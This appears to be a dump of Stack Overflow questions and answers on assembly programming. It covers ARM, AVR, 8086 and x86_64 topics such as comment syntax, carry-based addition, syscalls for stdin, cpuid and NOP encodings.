"cross compile (arm-none-eabi-as) arm assembly error ""junk at end of line /"" or undefined symbol","10994","","<p>Hi while i cross compile an startup.s file
(arm-none-eabi-as file.s)
(*-gcc)</p>

<p>I am getting in each commentary line some errors
- junk at end of line, first unrecognized character is <code>/</code></p>

<p>when i delete the // some comment lines i get
errors about undefined symbols even i defined them at beginning of the file.</p>

<p>anyone know whats wrong?</p>
","<p>(arm) Assembler does not support // comments or defines, you have to use .equ and @ for comments.  If you let gcc parse it you can put C isms like that into your assembler.  Personally I avoid such C isms and keep the assembler clean.   if you cannot do that or need includes with defines for example let gcc pre-process the file before sending it to gas.</p>
","3980828"
"What does the # value associated with the ARM LDR instruction mean?","10969","","<p>I'm trying to debug a crash I am experiencing in my application. The stack trace is pointing to an LDR instruction with the following format (thanks disassembler):</p>

<pre><code>LDR R3, [R0,#4]
</code></pre>

<p>My question is in regards to the source component. What does the #4 in the second parameter mean? I'm assuming it is some kind of offset, but I haven't found documentation supporting that for the LDR instruction.</p>
","<p>It loads R3 from the address in R0 + 4 bytes. So, yes, it is a byte offset. <a href=""http://www.davespace.co.uk/arm/introduction-to-arm/addressing.html"">See this explanation of the addressing modes</a>.</p>
","6097994"
"How to get input onto a new line with Assembly Language (Intel 8086)","10914","","<p>I'm asking a user to input a uppercase and it converts it to lowercase. I need the lowercase to be displayed on a new line. Here is my code:</p>

<pre><code>org 100h
include 'emu8086.inc'   
printn ""Enter a upper case character""  
mov ah,1
int 21h ;input a character into AL
mov bl,al
mov ah,0eh
mov al,bl
add al,20h
int 10h ;display lower case 
</code></pre>

<p>The output should be like:</p>

<pre><code>-&gt; Enter a upper case character
-&gt; A
-&gt; a
</code></pre>

<p>Current Result:</p>

<pre><code>-&gt; Enter a upper case character
-&gt; Aa
</code></pre>

<p>How do I get the lowercase a to the new line?</p>
","<p>The sequence for a new line is <code>0Dh 0Ah</code>. You can print this sequence with <code>int 10h / 0Eh</code> as if it were characters:</p>

<pre><code>org 100h
include 'emu8086.inc'   
printn ""Enter a upper case character""  
mov ah,1
int 21h           ;input a character into AL
mov bl,al

mov ah, 0Eh       ;print new line sequence
mov al, 0Dh
int 10h
mov al, 0Ah
int 10h

mov ah,0eh
mov al,bl
add al,20h
int 10h           ;display lower case 

ret
</code></pre>
","26312080"
"ATmega128: Adding and subtracting 16-bit numbers (assembly)","10867","","<p>I'm working with a ATmega128 microcontroller and supposedly need to add two 16-bit numbers. I'm using AVR Studio and this is what I got so far: </p>

<pre><code>.include ""m128def.inc"";

.equ    ramstart = 0x100
.def    temp = r16

.dseg
.org ramstart
number1: .byte 2
number2: .byte 2

.cseg
.org 0

rjmp start

start:
    ; number1 := 0x7856
    ldi temp, low(number1)
    sts number1, temp
    ldi temp, high(number1)
    sts number1+1, temp

    ; number2 := 0x34B2
    lds temp, number1
    sts number2, temp
    lds temp, number1+1
    sts number2+1, temp

slutt:
    rjmp slutt
</code></pre>

<p>This is not far from the first time I'm using any type of assembly, I know I'm doing something wrong, but can't seem to figure out what. Am I missing the carry flag?</p>
","<p>Back to gradeschool with pencil and paper.  If I want to add 1234 and 5678</p>

<pre><code>  1234
+ 5678
======
</code></pre>

<p>4+8 is 2 carry the 1</p>

<pre><code>    1
  1234
+ 5678
======
     2    
</code></pre>

<p>and so on</p>

<pre><code> 00110 &lt;-- carry bits
  1234 &lt;-- first operand
+ 5678 &lt;-- second operand
======
  6912
</code></pre>

<p>the carry bit above the ones column is significant, it is called the carry in, and the carry
bit that leaves the leftmost column is carry out.</p>

<p>What if I only had paper wide enough to add two columns at a time?</p>

<pre><code> 110 
  34 
+ 78 
======
  12
</code></pre>

<p>I start with the two lower sets of digits, and I require a zero as a carry in.  I get a result 12 with a carry out.</p>

<p>Now I take that carry out, use it as a carry in for the next two digits.  This adder I must be able to take a carry out from a prior add and use it as the carry in for this add.</p>

<pre><code> 001
  12
+ 56
====
  69
</code></pre>

<p>When all is said and done I get 69 and 12, put those together I get 6912 but didnt need a full 4 digit adder to get there.  You can repeat this forever or until you run out of memory, registers or clock cycles.</p>

<p>The avr may have other ways to solve the problem, but most processors at least have two forms of add and two forms of subtract so that you can cascade the adder to be as wide as you need.  Examine the instruction set for the avr and what is going on above should jump out at you.</p>

<p>EDIT:</p>

<p>A C example might help...(switching to hex)</p>

<pre><code>unsigned int a,b,c,d,cin,cout,x,y;

a=0x12; b=0x34;
c=0x56; d=0x78;

x=b+d; //dont want a carry in or assume it is zero
cout=x&amp;0x100; 
if(cout) cin=1; else cin=0;
y=a+c+cin; //need the carry out on the prior add as the carry in here

x&amp;=0xFF;
y&amp;=0xFF;

printf(""0x%02X%02X\n"",y,x);
</code></pre>

<p>EDIT2:</p>

<p>I hope this is not a homework assignment...</p>

<pre><code>ldi r20,0x12
ldi r21,0x34
ldi r22,0x56
ldi r23,0x78
add r21,r23
adc r20,r22
</code></pre>

<p>result is in r20 high byte, and r21 low byte</p>

<p>if you need to read from ram there are many ways, this assumes the 16 bit numbers are little endian</p>

<pre><code>lds r0,0x100
lds r1,0x101
lds r2,0x102
lds r3,0x103
add r0,r2
adc r1,r3
</code></pre>

<p>r0 low half of result, r1 upper half.</p>

<p>or use one of the x,y,or z pointer registers</p>

<pre><code>;put 0x0100 in Z
ldi r30,0x00
ldi r31,0x01
ld r0,z+
ld r1,z+
ld r2,z+
ld r3,z+
add r0,r2
adc r1,r3
</code></pre>
","9219052"
"How do assembly languages work?","10861","","<p>I'm very curious how assembly languages work- I remain general because I'm not talking only about intel x86 assembly (although it's the only one I'm remotely familiar with). To be a bit more clear...</p>

<pre><code>mov %eax,%ebx
</code></pre>

<p>How does the computer know what an instruction like ""mov"" does? How does it know that eax and ebx are registers? Do people write grammars for assembly languages? How do they write this? I imagine nothing is stopping someone from writing an assembly language that substitutes the <code>mov</code> instruction with something like <code>dog</code> or <code>horse</code> etc., (obviously this isn't semantic at all)</p>

<p>Sorry if this isn't too clear, but it's something I find a bit puzzling- I know it can't be magic, but I can't see how it works. I've looked up some stuff on wikipedia, but all it seems to say is it translates it down to machine code, well, what I'm asking is how that translation occurs I suppose.</p>

<p>Thoughts?</p>

<p>EDIT: I realize that this stuff is defined in reference manuals and things, I guess what I wish to know is how you tell your processor ""Okay, when you see <code>mov</code> you're gonna do this"". I also know that it's a sequence of probably a ton of logic gates..but there has to be some way for the processor to recognize is that <code>mov</code> is the symbol that means ""use these logic gates""</p>
","<p>What you see there are mnemonics, which make it easy for a programmer to write assembly, it is however not executable in mnemonic form.
when you pass these assembly instructions through an assembler, they are translated into machine code they represent, which is what the CPU and its various co-processors interpret and execute (its generally taken down into smaller units by the CPU, called micro-ops).</p>

<p>if your curious as to how exactly it does that, well thats a long process, but <a href=""http://proquest.safaribooksonline.com/book/engineering/032124656x"">this</a> has all that information.</p>

<p>All the semantics etc are handled by the assembler, which checks for validity and integrity where possible (one can still assemble invalid code however!). this basically makes assembly a low-level language, even though it has a 1 to 1 correlation to the outputted machine code (except when using macro based assemblers, but then the macro's still expand to 1 to 1). </p>
","6464064"
"How do I call ""cpuid"" in Linux?","10844","","<p>While writing new code for Windows, I stumbled upon <code>_cpuinfo()</code> from the Windows API. As I am mainly dealing with a Linux environment (GCC) I want to have access to the CPUInfo.</p>

<p>I have tried the following:</p>

<pre><code>#include &lt;iostream&gt;

int main()
{
  int a, b;

  for (a = 0; a &lt; 5; a++)
  {
    __asm ( ""mov %1, %%eax; ""            // a into eax
          ""cpuid;""
          ""mov %%eax, %0;""             // eax into b
          :""=r""(b)                     // output
          :""r""(a)                      // input
          :""%eax"",""%ebx"",""%ecx"",""%edx"" // clobbered register
         );
    std::cout &lt;&lt; ""The code "" &lt;&lt; a &lt;&lt; "" gives "" &lt;&lt; b &lt;&lt; std::endl;
  }

  return 0;
}
</code></pre>

<p>This use assembly but I don't want to re-invent the wheel. Is there any other way to implement CPUInfo without assembly? </p>

<p>Compiler errors:</p>

<pre><code>lewis@lewis-desktop:~/Desktop/prog$ g++ -Wall CPUInfo.cpp
CPUInfo.cpp: In function ‘int main()’:
CPUInfo.cpp:10:22: error: expected ‘)’ before ‘;’ token
CPUInfo.cpp:10:23: error: expected primary-expression before ‘)’ token
CPUInfo.cpp:10:23: error: expected ‘;’ before ‘)’ token
CPUInfo.cpp:8:8: warning: unused variable ‘b’ [-Wunused-variable]
CPUInfo.cpp:12:8: error: expected ‘}’ at end of input
</code></pre>
","<p>Since you are compiling with GCC then you can include <code>cpuid.h</code> which declares these functions:</p>

<pre><code>/* Return highest supported input value for cpuid instruction.  ext can
   be either 0x0 or 0x8000000 to return highest supported value for
   basic or extended cpuid information.  Function returns 0 if cpuid
   is not supported or whatever cpuid returns in eax register.  If sig
   pointer is non-null, then first four bytes of the signature
   (as found in ebx register) are returned in location pointed by sig.  */
unsigned int __get_cpuid_max (unsigned int __ext, unsigned int *__sig)

/* Return cpuid data for requested cpuid level, as found in returned
   eax, ebx, ecx and edx registers.  The function checks if cpuid is
   supported and returns 1 for valid cpuid information or 0 for
   unsupported cpuid level.  All pointers are required to be non-null.  */
int __get_cpuid (unsigned int __level,
    unsigned int *__eax, unsigned int *__ebx,
    unsigned int *__ecx, unsigned int *__edx)
</code></pre>

<p>You don't need to, and should not, re-implement this functionality.</p>
","14266932"
"How does printf work internally?","10844","","<p>I am curious as to how <code>printf</code> works internally within Linux. I don't understand how it writes data to <code>STDOUT</code>.</p>

<p>After a bit of searching for the internals, I downloaded <code>glibc</code> and took a look at the source code:</p>

<pre><code>__printf (const char *format, ...)
{
   va_list arg;
   int done;

   va_start (arg, format);
   done = vfprintf (stdout, format, arg);
   va_end (arg);

   return done;
}
</code></pre>

<p>After finding this, I went deeper into the <code>vfprintf</code> function - but the file is about 2500 lines of unfamiliar C code. I'm looking for an explanation from 10,000 feet of how printf works with a computer's memory and output to display characters on screen.</p>

<p>If I were a piece of assembly code what would I have to do to accomplish the same task? Is it operating system dependent?</p>
","<p>I think you're looking at the wrong layer. The logic in <code>vfprintf</code> is responsible for formatting its arguments and writing them through the underlying stdio functions, usually into a buffer in the <code>FILE</code> object it's targetting. The actual logic for getting this output to the file descriptor (or on other non-POSIX-like systems, the underlying device/file representation) is probably in <code>fwrite</code>, <code>fputc</code>, and/or some <code>__</code>-prefixed internal functions (perhaps <code>__overflow</code>).</p>
","18279987"
"Why does Visual Studio use xchg ax,ax","10834","","<p>I was looking through the disassmbly of my program (because it crashed), and noticed lots of </p>

<pre><code>xchg    ax, ax
</code></pre>

<p>I googled it and found out it's essentially a nop, but why does visual studio do an xchg instead of a noop?</p>

<p>The application is a C# .NET3.5 64-bit application, compiled by visual studio</p>
","<p>On x86 the <code>NOP</code> instruction <em>is</em> <code>XCHG AX, AX</code></p>

<p>The 2 mnemonic instructions assemble to the same binary op-code. <strike>(Actually, I suppose an assembler could use any <code>xchg</code> of a register with itself, but <code>AX</code> or <code>EAX</code> is what's typically used for the <code>nop</code> as far as I know).</strike></p>

<p><code>xchg ax, ax</code> has the properties of changing no register values and changing no flags (hey - it's a no op!).</p>

<hr>

<p><strong>Edit</strong> (in response to a comment by Anon.):</p>

<p>Oh right - now I remember there are several encodings for the <code>xchg</code> instruction.  Some take a mod/r/m set of bits (like many Intel x86 architecture instructions) that specify a source and destination.  Those encodings take more than one byte.  There's also a special encoding that uses a single byte and exchanges a general purpose register with <code>(E)AX</code>.  If the specified register is also <code>(E)AX</code> hen you have a single-byte NOP instruction.  you can also specify that <code>(E)AX</code> be exchanged with itself using the larger variant of the <code>xchg</code> instruction.</p>

<p>I'm guessing that MSVC uses the multiple byte version of <code>xchg</code> with <code>(E)AX</code> as the source and destination when it wants to chew up more than one byte for no operation - it takes the same number of cycles as the single byte <code>xchg</code>, but uses more space.  In the disassembly you won't see the multiple byte <code>xchg</code> decoded as a <code>NOP</code>, even if the result is the same.</p>

<p>Specifically <code>xchg eax, eax</code> or <code>nop</code> could be encoded as opcodes <code>0x90</code> or <code>0x87 0xc0</code> depending on whether you want it to use up 1 or 2 bytes. The Visual Studio disassembler (and probably others) will decode the opcode <code>0x90</code> as the <code>NOP</code> instruction and will decode opcode <code>0x87 0xc0</code> as <code>xchg eax, eax</code>.</p>

<p>It's been a while since I've done detailed assembly language work, so chances are I'm wrong on at least one count here...</p>
","2136065"
"Adding signed numbers in assembly","10832","","<p>I want to sum an array elements. This array contains positive and negative numbers.</p>

<pre><code>array db 07, 00, -3, 10, -7, 14, 9, -5, -100


lea ax, data
mov ds, ax
mov es, ax

lea si, array
mov cx, [si] 
mov si, 0002h
xor ax, ax
xor dx, dx 
Addition:
mov bl, [si]
cmp bl, 00h
jl NEGATIVE
xor bh, bh ;
jmp NEXTT
NEGATIVE:
mov bh, 0ffh
NEXTT:
add ax, bx
adc dx, 0
add si, 1
loop Addition
</code></pre>

<p>The sum (<code>DX:AX</code>) using this code = 0003 FFAE H which is wrong. I think that the right answer is 
FFFFFFAE H.</p>

<p><strong>1- How can I fix this problem?</strong></p>

<p><strong>2- How can I know whether a number in a register (AX for example) is positive or negative?</strong></p>

<p><strong>I use emu8086</strong></p>
","<p>It seems that you don't handle integer overflow appropriately. Carry flag is for <strong>unsigned</strong> addition and subtraction, but you want <strong>signed</strong> addition. Overflow flag is for signed addition, it's set always when the sign changes.</p>

<p><strong>Edit:</strong> Previous untested code didn't work properly. Here's the corrected (and self-contained) code. Tested with MASM 6.11.</p>

<pre>
.model small
.stack 4096

.data
array_size      dw 7
array           db -3, 10, -7, 14, 9, -5, -100
numbers         db '0123456789abcdef'

.code
start:
        mov     ax,seg array_size ; lea ax, data
        mov     ds,ax
        mov     es,ax

        mov     cx,[array_size]   ; cx = array size in bytes.
        lea     si,array          ; si points to the array.

; number is computed in dx:bx.

        xor     dx,dx
        xor     bx,bx

adding_loop:
        mov     al,[si]           ; number is read in al.
        cbw                       ; cbw sign-extends al to ax.
        test    ax,ax             ; check the sign of the addend.
        js      negative

positive:                         ; the addend is positive.
        add     bx,ax             ; add.
        adc     dx,0              ; carry.
        jmp     next_number

negative:                         ; the addend is negative.
        neg     ax                ; ax = |ax|.
        sub     bx,ax             ; subtract.
        sbb     dx,0              ; borrow.

next_number:
        inc     si                ; next number.
        loop    adding_loop

; result now in dx:bx.

        mov     ax,bx             ; result now in dx:ax.

; the rest of the code is only for printing.

        push    bx                ; push lower word.
        mov     bx,dx             ; copy the upper word to bx.
        call    print_word_in_hexadecimal

        push    dx                ; push upper word.
        mov     ah,2
        mov     dl,':'
        int     21h               ; print ':'
        pop     dx                ; pop upper word.

        pop     bx                ; pop lower word.
        call    print_word_in_hexadecimal

        mov     ah,4ch
        int     21h

; input:        bx: word to be printed.
; output:       -
print_word_in_hexadecimal:
        push    bx
        push    cx
        push    dx
        mov     cl,4              ; count for rol.
        mov     ch,4              ; 4 nibbles in each word.
next_nibble:
        rol     bx,cl             ; rotate 4 bits to the left.
        push    bx                ; push rotated word.
        and     bx,0fh
        mov     dl,[bx+numbers]
        mov     ah,2              ; print character.
        int     21h
        pop     bx                ; pop rotated word.
        dec     ch
        jnz     next_nibble

        pop     dx
        pop     cx
        pop     bx
        ret
end start
</pre>

<p>The above code does the signed integer addition for 8-bit values (the 8-bit values are extended to 16-bit values). Register usage has been changed to allow usage of <code>cbw</code> for cleaner code. Adding negative numbers has been converted to subtraction, for simplicity. Hardcoded offset of array (<code>mov si, 0002h</code>, which works only if the array is located at offset 2) has been replaced with <code>lea si,array</code>:</p>

<pre>
size_of_array dw 7
array         db -3, 10, -7, 14, 9, -5, -100
</pre>

<p>And the corresponding changes in the code:</p>

<pre>
lea si, size_of_array ; or you can replace these 2 lines with:
mov cx, [si]          ; 1. mov cx,size_of_array (TASM/MASM syntax).
lea si, array
</pre>

<p>And how to check if a number is negative or positive? Well, you check the highest bit. For example, as in my code (<code>test</code> does logical AND but doesn't save the result, it only updates the flags):</p>

<pre>
        test    ax,ax    ; do logical AND for ax,ax but don't save the result.
        js      negative ; jumps if the number is negative.

positive:
        ; the number is positive.
        jmp     my_label

negative:
        ; the number is negative.

my_label:
</pre>
","20303752"
"Difference between MOVDQA and MOVAPS x86 instructions?","10828","","<p>I'm looking Intel datasheet: <strong>Intel® 64 and IA-32 Architectures
Software Developer’s Manual</strong>  and I can't find the difference between </p>

<ul>
<li><strong>MOVDQA</strong>: Move Aligned Double Quadword</li>
<li><strong>MOVAPS</strong>: Move Aligned Packed Single-Precision</li>
</ul>

<p>In Intel datasheet I can find for both instructions:</p>

<blockquote>
  <p>This instruction can be used to load an XMM register from a 128-bit
  memory location, to store the contents of an XMM register into a
  128-bit memory location, or to move data between two XMM registers.</p>
</blockquote>

<p>The only difference is:</p>

<blockquote>
  <p>To move a double quadword to or from unaligned memory locations, use
  the MOVDQU instruction.</p>
</blockquote>

<p>and</p>

<blockquote>
  <p>To move packed single-precision floating-point values to or from
  unaligned memory locations, use the MOVUPS instruction.</p>
</blockquote>

<p>But I can't find the reason why two different instructions?</p>

<p><strong>So can anybody explain the difference?</strong></p>
","<p>In functionality, they are identical.</p>

<p>On <strong>some</strong> (but not all) micro-architectures, there are timing differences due to ""domain crossing penalties"".  For this reason, one should generally use <code>movdqa</code> when the data is being used with integer SSE instructions, and <code>movaps</code> when the data is being used with floating-point instructions.  For more information on this subject, consult the Intel Optimization Manual, or Agner Fog's excellent microarchitecture guide.  Note that these delays are most often associated with register-register moves instead of loads or stores.</p>
","6678438"
"Convert single hexadecimal digit to decimal Intel 8086 Assembly Language","10817","","<p>Hi I'm having trouble with this code. It will print 0-9 fine but A-F or a-f it just gives me a smiley face which isn't even an ASCII symbol atleast according to the list of symbols my professor has provided us. Here is a my code. Please help. I'm using NASM and DosBox.</p>

<pre><code>    org 100h
; hexadecimal to base 10 conversion program
section .data
    MSG1    dw  "" Enter a hexadecimal digit "", '$'
    MSG2    dw  "" In decimal it is: "", '$'
    MSG3    dw  "" Do you want to do it again? "", '$'
    EMSG    dw  "" Illegal character, enter 0..9 or A..F: "", '$'
section .text
main:   
; print user prompt 
     mov    dx, MSG1    ; get message
     mov    ah, 09h     ; display string function
     int    21h     ; display it
     jmp    userin      ; jumps to user input so if illegal character is entered message won't display again
userin:
; input a hexidecimal number then compare to ASCII codes
     mov    ah, 01h     ; keyboard input function
     int    21h     ; character input, copies character into al
     mov    bh, al      ; moves al into bh to avoid al being messed with
     cmp    bh, 30h     ; compares input to ASCII code for 0
      jl    error       ; if input is less than 0 jump to main
     cmp    bh, 39h     ; compares input to ASCII code for 9
     jle    print1      ; if input is less than or equal to 9 jump to print
     cmp    bh, 41h     ; compares input to ASCII code for 'A'
      jl    error       ; if input is less than 'A' jump to main
     cmp    bh, 46h     ; compares input to ASCII code for 'F'
     jle    convert1    ; if input is less than or equal to 'F' jump to convert1
     cmp    bh, 61h     ; compares input to ASCII code for 'a'
      jl    error       ; if input is less than 'a' jump to main
     cmp    bh, 66h     ; compares input to ASCII code for 'f'
     jle    convert2    ; if input is less than of equal to 'f' jump to convert2
      jg    error       ; if input is greater than 'z' jump to main
error:
; displays error message then jumps back
     mov    dx, EMSG    ; moves error message into display string register
     mov    ah, 09h     ; display string function
     int    21h     ; displays it
     jmp    userin      ; jumps back to user input
convert1:
; converts input from hexadecimal A-F to decimal
     sub    bh, 16      ; subtracts 0Fh from input to get decimal
     jmp    print2      ; jumps to print
convert2:
; converts input from hexidecimal a-f to decimal
     sub    bh, 48      ; subtracts 30h from the input to get 
     jmp    print2      ; jumps to print
print1:
; prints the input in decimal form
     mov    dx, MSG2    ; moves MSG2 into display string register
     mov    ah, 09h     ; display string function
     int    21h     ; display MSG2 ""In decimal it is:""
     mov    dl, bh      ; moves input into display character register
     mov    ah, 02h     ; display character function
     int    21h     ; display input in decimal form
     jmp    again       ; jumps to again
print2:
;prints the input in decimal form
     mov    dx, MSG2    ; moves MSG2 into display string register
     mov    ah, 09h     ; display string function
     int    21h     ; display MSG2 ""In decimal it is:""
     mov    dl, 1d      ; will add 10 to the converted ASCII code
     mov    ah, 02h     ; display character function
     int    21h     ; display 1 in front of input in decimal form
     mov    dl, bh      ; moves converted input to display character register
     mov    ah, 02h     ; display character function
     int    21h     ; displays converted input
     jmp    again       ; jumps to again
again:
; asks if user wants to do it again
     mov    dx, MSG3    ; moves MSG2 into display string register
     mov    ah, 09h     ; display string function
     int    21h     ; display MSG3 ""Do you want to do it again?""
     mov    ah, 01h     ; keyboard input function
     int    21h     ; character input, copies into al
     cmp    al, 59h     ; compares input to ASCII code for 'Y'
      je    main        ; if input is equal to 'Y' jump to main
      jl    exit        ; if input is less than 'Y' jump to exit
     cmp    al, 79h     ; compares input to ASCII code for 'y'
      je    main        ; if input is equal to 'y' jump to main 
     jne    exit        ; if input is not equal to 'y' jump to exit
exit:
;exit to DOS
      mov     ah, 04Ch      ; DOS function: Exit program 
      mov     al, 0         ; Return exit code value
      int     21h           ; Call DOS. Terminate program 
</code></pre>
","<p>The calculations are correct, but the code which should print leading '1' is wrong. You need to put character code in DL, not the number. So instead of</p>

<pre><code> mov    dl, 1d      ; will add 10 to the converted ASCII code
 mov    ah, 02h     ; display character function
 int    21h     ; display 1 in front of input in decimal form
</code></pre>

<p>it should be</p>

<pre><code> mov    dl, 49      ; will add 10 to the converted ASCII code
 mov    ah, 02h     ; display character function
 int    21h     ; display 1 in front of input in decimal form
</code></pre>
","21958446"
"How to read input from STDIN in x86_64 assembly?","10807","","<p>I am trying to learn x86_64 assembly and I was trying standard input output today and stumbled upon this post <a href=""https://stackoverflow.com/questions/7006926/learning-assembly-echo-program-name"">Learning assembly - echo program name</a> How would I do the same for reading the input from STDIN (using SYSCALL instruction)? Especially if I know that the input will always be an integer and I want to read it to a register?</p>

<p><strong>EDIT:</strong> @Daniel Kozar's answer below helped me understand how STDIN and STDOUT stuff work with the SYSCALL instruction on Linux. I attempted to write a small program, that reads a number from the console input and prints the ascii character corresponding to that number. Say if you type 65 as input, you should get A as output. And also a new line character. If at all, it helps any one else :-)</p>

<pre><code>section .text
    global _start

_start:
    mov rdi, 0x0      ; file descriptor = stdin = 0
    lea rsi, [rsp+8]  ; buffer = address to store the bytes read
    mov rdx, 0x2      ; number of bytes to read
    mov rax, 0x0      ; SYSCALL number for reading from STDIN
    syscall           ; make the syscall

    xor rax, rax      ; clear off rax
    mov rbx, [rsp+8]  ; read the first byte read into rsp+8 by STDIN call to rbp
    sub rbx, 0x30     ; Since this is read as a character, it is obtained as ASCII value, so subtract by 0x30 to get the number
    and rbx, 0xff     ; This ensures that everything other than the last byte is set to 0 while the last byte is as is
    mov rax, rbx      ; move this value to rax since we want to store the final result in rax
    shl rbx, 0x1      ; We need to multiply this by 10 so that we can add up all the digits read so multiplying the number by 2 and then by 8 and adding them up, so multiply by 2 here
    shl rax, 0x3      ; multiply by 8 here
    add rax, rbx      ; add 8 times multiplied value with 2 times multiplied value to get 10 times multiplied value
    mov rbx, [rsp+9]  ; now read the next byte (or digit)
    sub rbx, 0x30     ; Again get the digit value from ASCII value of that digit's character
    and rbx, 0xff     ; clear higher bytes
    add rax, rbx      ; Add this to rax as unit's place value
    mov [rsp+8], rax  ; Move the entire byte to rax
    mov rdi, 0x1      ; file descriptor = stdout
    lea rsi, [rsp+8]  ; buffer = address to write to console
    mov rdx, 0x1      ; number of bytes to write
    mov rax, 0x1      ; SYSCALL number for writing to STDOUT
    syscall           ; make the syscall

    xor rax, rax      ; clear off rax
    mov rax, 0xa      ; move the new line character to rax
    mov [rsp+8], rax  ; put this on the stack
    mov rdi, 0x1      ; file descriptor = stdout
    lea rsi, [rsp+8]  ; buffer = address to write to console
    mov rdx, 0x1      ; number of bytes to write
    mov rax, 0x1      ; SYSCALL number for writing to STDOUT
    syscall           ; make the syscall

    mov rdi, 0        ; set exit status = 0
    mov rax, 60       ; SYSCALL number for EXIT
    syscall           ; make the syscall
</code></pre>

<p><strong>EDIT 2:</strong> Here is my attempt to read an unsigned 32-bit decimal integer from standard input, store it as integer for computations and then write that back to std out.</p>

<pre><code>section .text
        global _start

_start:
;Read from STDIN
        mov rdi, 0x0      ; file descriptor = stdin = 0
        lea rsi, [rsp+8]  ; buffer = address to store the bytes read
        mov rdx, 0xa      ; number of bytes to read
        mov rax, 0x0      ; SYSCALL number for reading from STDIN
        syscall           ; make the syscall


; Ascii to decimal conversion
        xor rax, rax      ; clear off rax
        mov rbx, 0x0      ; initialize the counter which stores the number of bytes in the string representation of the integer
        lea rsi, [rsp+8]  ; Get the address on the stack where the first ASCII byte of the integer is stored.

rnext:
        mov rcx, [rsi]    ; Read the byte on the stack at the address represented by rsi
        cmp rcx, 0xa      ; Check if it is a newline character
        je  return        ; If so we are done
        cmp rbx, 0xa      ; OR check if we have read 10 bytes (the largest 32 bit number contains 10 digits, so we will have to process at most 10 bytes
        jg  return        ; If so we are done
        sub rcx, 0x30     ; For the byte read, subtract by 0x30/48 to get the value from the ASCII code. 0 == 0x30 in ASCII, 1 == 0x31 in ASCII and so on.
        and rcx, 0xff     ; Clear off the higher order bytes to ensure there is no interference
        mov rdx, rax      ; We need to multiple this by 10 to get the next byte which goes to the unit's place and this byte becomes the ten's value. So make a copy
        shl rax, 0x3      ; Multiply the original by 8 (Shift left by 3 is multiply by 8)
        shl rdx, 0x1      ; Multiply the copy by 2 (Shift left by 1 is multiply by 2)
        add rax, rdx      ; Add these a * 8 + a * 2 to get a * 10.
        add rax, rcx      ; Add the digit to be at the units place to the original number
        add rsi, 1        ; Advance the memory address by 1 to read the next byte
        inc rbx           ; Increment the digit counter
        jmp rnext         ; Loop until we have read all the digits or max is reached.

return:
        push rax          ; Push the read number on to the stack

; write New Line
        mov rax, 0xa      ; move the new line character to rax
        mov [rsp+8], rax  ; put this on the stack
        mov rdi, 0x1      ; file descriptor = stdout
        lea rsi, [rsp+8]  ; buffer = address to write to console
        mov rdx, 0x1      ; number of bytes to write
        mov rax, 0x1      ; SYSCALL number for writing to STDOUT
        syscall           ; make the syscall


; Convert from Decimal to bytes
        xor  rdx, rdx     ; Clear rdx which stores obtains a single digit of the number to convert to ASCII bytes
        mov  r8, 0x0      ; Initialize the counter containing the number of digits

        pop  rax          ; Pop the read number from the stack
        mov  rbx, 0xa     ; We store the divisor which is 10 for decimals (base-10) in rbx. rbx will be the divisor.

wnext: 
        div  rbx          ; Divide the number in rdx:rax by rbx to get the remainder in rdx
        add  rdx, 0x30    ; Add 0x30 to get the ASCII byte equivalent of the remainder which is the digit in the number to be written to display.
        push rdx          ; Push this byte to the stack. We do this because, we get the individial digit bytes in reverse order. So to reverse the order we use the stack
        xor  rdx, rdx     ; Clear rdx preparing it for next division
        inc  r8           ; Increment the digits counter
        cmp  rax, 0x0     ; Continue until the number becomes 0 when there are no more digits to write to the console.
        jne  wnext        ; Loop until there aren't any more digits.

popnext:
        cmp  r8, 0x0      ; Check if the counter which contains the number of digits to write is 0
        jle  endw         ; If so there are no more digits to write
        mov  rdx, 0x1     ; number of bytes to write
        mov  rsi, rsp     ; buffer = address to write to console
        mov  rdi, 0x1     ; file descriptor = stdout
        mov  rax, 0x1     ; SYSCALL number for writing to STDOUT
        syscall           ; make the syscall
        dec  r8           ; Decrement the counter
        pop  rbx          ; Pop the current digit that was already written to the display preparing the stack pointer for next digit.
        jmp  popnext      ; Loop until the counter which contains the number of digits goes down to 0.

endw:
; write New Line
        xor rax, rax      ; clear off rax
        mov rax, 0xa      ; move the new line character to rax
        mov [rsp+9], rax  ; put this on the stack
        mov rdi, 0x1      ; file descriptor = stdout
        lea rsi, [rsp+9]  ; buffer = address to write to console
        mov rdx, 0x1      ; number of bytes to write
        mov rax, 0x1      ; SYSCALL number for writing to STDOUT
        syscall           ; make the syscall

; Exit
        mov rdi, 0        ; set exit status = 0
        mov rax, 60       ; SYSCALL number for EXIT
        syscall           ; make the syscall
</code></pre>
","<p>First of all : there are no <strong>variables</strong> in assembly. There are just labels for some kind of data. The data is, by design, untyped - at least in real assemblers, not HLA (e.g. MASM).</p>

<p>Reading from the standard input is achieved by using the system call <code>read</code>. I assume you've already read the post you mentioned and you know how to call system calls in x64 Linux. Assuming that you're using NASM (or something that resembles its syntax), and that you want to store the input from <code>stdin</code> at the address <code>buffer</code>, where you have reserved <code>BUFSIZE</code> bytes of memory, executing the system call would look like this :</p>

<pre><code>xor eax, eax ; rax &lt;- 0 (write syscall number)
xor edi, edi ; rdi &lt;- 0 (stdin file descriptor)
mov rsi, buffer ; rsi &lt;- address of the buffer
mov edx, BUFSIZE ; rdx &lt;- size of the buffer
syscall ; execute
</code></pre>

<p>Upon returning, <code>rax</code> will contain the result of the syscall. If you want to know more about how it works, please consult <code>man 2 read</code>.</p>

<p>Parsing an integer in assembly language is not that simple, though. Since <code>read</code> only gives you plain binary data that appears on the standard input, you need to convert the integer value yourself. Keep in mind that what you type on the keyboard is sent to the application as ASCII codes (or any other encoding you might be using - I'm assuming ASCII here). Therefore, you need to convert the data from an ASCII-encoded decimal to binary.</p>

<p>A function in C for converting such a structure to a normal unsigned int would look something like this :</p>

<pre><code>unsigned int parse_ascii_decimal(char *str,unsigned int strlen)
{
    unsigned int ret = 0, mul = 1;
    int i = strlen-1;
    while(i &gt;= 0)
    {
        ret += (str[i] &amp; 0xf) * mul;
        mul *= 10;
        --i;
    }
    return ret;
}
</code></pre>

<p>Converting this to assembly (and extending to support signed numbers) is left as an exercise for the reader. :)</p>

<p>Last but not least - the <code>write</code> syscall requires you to always pass a pointer to a buffer with the data that's supposed to be written to a given file descriptor. Therefore, if you want to output a newline, there is no other way but to create a buffer containing the newline sequence.</p>
","9647094"
"x86 jump to an address","10778","","<p>As an assignment for a security class, I am trying to use <code>__asm__(""jmp 0xbffff994"");</code> in my code, but when I disassemble things in gdb, the instruction is changed to <code>jmp 0xc8047e2a</code>.
Any idea why and how can I jump to a particular address?</p>
